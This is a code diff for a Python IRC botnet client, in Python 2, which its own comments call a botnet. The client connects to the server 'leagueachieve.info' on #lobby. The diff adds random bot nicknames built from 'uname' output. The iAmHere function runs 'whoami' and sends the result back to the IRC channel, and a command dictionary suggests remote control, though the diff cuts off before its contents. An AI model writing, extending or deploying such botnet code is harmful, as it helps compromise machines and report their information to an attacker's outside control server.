@@ -14,24 +14,43 @@ import time
 import platform
 import os
 import subprocess as sub
+from random import randint
 
-#IRC Settings
-server = "leagueachieve.info"
-channel = "#lobby"
-botnick = "bot1"
+def genNick():
+	flavor = execute('uname')
+	rannum = str(randint(000, 999))
+	nick = str(flavor) + str(rannum)
+	return str(nick)
 
 def execute(cmd):
 	p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
 	output, errors = p.communicate()
-	output = output.strip()
+	output = output.strip('\n')
 	return output
 
+#IRC Settings
+server = "leagueachieve.info"
+channel = "#lobby"
+botnick = genNick()
+
+print botnick
+
+#All of the possible functions that the botnet is capable of
 def iAmHere(): #send back to IRC server that you are here
-	info = execute("whoami")	
-	irc.send('PRIVMSG ' + channel + " :" + str(info) + '\r\n')
+	cmd  = execute("whoami")	
+	irc.send('PRIVMSG ' + channel + " :" + cmd + '\r\n')
 
 def iAmGood(): #send back to IRC server that you are good
 	print "'iAmGood' function not yet implemented"
+
+
+#function that handles multiple-line output
+#def multipleLines():
+
+
+
+
+
 
 #dictionary of functions
 commands = {
